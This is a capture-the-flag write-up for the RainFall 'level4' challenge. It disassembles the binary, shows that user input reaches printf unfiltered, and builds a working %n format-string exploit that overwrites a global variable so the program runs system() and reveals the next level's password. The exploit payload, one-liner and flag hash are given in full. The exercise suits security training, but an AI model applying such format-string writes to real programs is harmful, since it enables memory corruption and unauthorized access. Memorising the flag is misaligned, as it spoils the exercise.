# **Level4**

In this level, we found a binary that takes input and prints it:

```bash
level4@RainFall:~$ ./level4
wqw
wqw
level4@RainFall:~$
```

## **Binary Analysis**

Using GDB, we analyzed the binary and found that the `main` function simply calls the function n:

```bash
(gdb) disas main
Dump of assembler code for function main:
0x080484a7 <+0>:	push   %ebp
0x080484a8 <+1>:	mov    %esp,%ebp
0x080484aa <+3>:	and    $0xfffffff0,%esp
0x080484ad <+6>:	call   0x8048457 <n>
0x080484b2 <+11>:	leave
0x080484b3 <+12>:	ret
End of assembler dump.
(gdb)
```

Analyzing the n function reveals that the program uses **`fgets`** to read input into a buffer, which is then passed directly to p function  prints the input using printf.  The function also compares a global variable, **`m`** (located at 0x8049810), with **`0x1025544`** (16930116 in decimal). If the comparison succeeds, it calls **`system`**.

```nasm
(gdb) disas n
0x08048457 <n+0>:       push   %ebp
0x08048458 <n+1>:       mov    %esp,%ebp
0x0804845a <n+3>:       sub    $0x218,%esp        ; Allocate 536 bytes
0x08048460 <n+9>:       mov    0x8049804,%eax     ; stdin
0x08048465 <n+14>:      mov    %eax,0x8(%esp)
0x08048469 <n+18>:      movl   $0x200,0x4(%esp)   ; Size = 512
0x08048471 <n+26>:      lea    -0x208(%ebp),%eax  ; Buffer
0x08048477 <n+32>:      mov    %eax,(%esp)
0x0804847a <n+35>:      call   0x8048350 <fgets@plt>
0x0804848d <n+54>:      mov    0x8049810,%eax     ; Load global variable
0x08048492 <n+59>:      cmp    $0x1025544,%eax    ; Compare with 0x1025544
0x08048497 <n+64>:      jne    0x80484a5 <n+78>   ; Jump if not equal
0x08048499 <n+66>:      movl   $0x8048590,(%esp)  ; "/bin/cat /home/user/level5/.pass"
0x080484a0 <n+73>:      call   0x8048360 <system@plt>
(gdb)
```

**Finding the Format String Offset**

```nasm
level4@RainFall:~$ ./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141
level4@RainFall:~$
```

- Our input "AAAA" (41414141 in hex) appears at position 12. we used to Each %x shows a memory value

## **Vulnerability**

The vulnerability is in function **`p`** where user input is passed directly to **`printf`**, allowing for a format string attack.

## **Exploit**

We need to write **`0x1025544`** (16930116) to **`0x8049810`**. We can use **`%n`** with the correct padding:

```python
# Target address (0x8049810) in little-endian
address = "\x10\x98\x04\x08"

# Need total bytes = 16930116 (0x1025544)
# 4 bytes for address, so padding = 16930116 - 4
padding = "%16930112x"

# Write to 12th parameter
write = "%12$n"

# Final exploit
exploit = address + padding + write
```

1. Create and run exploit

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
```

1. Result

```bash
level4@RainFall:~$ cat /tmp/exploit | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Flag

```nasm
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```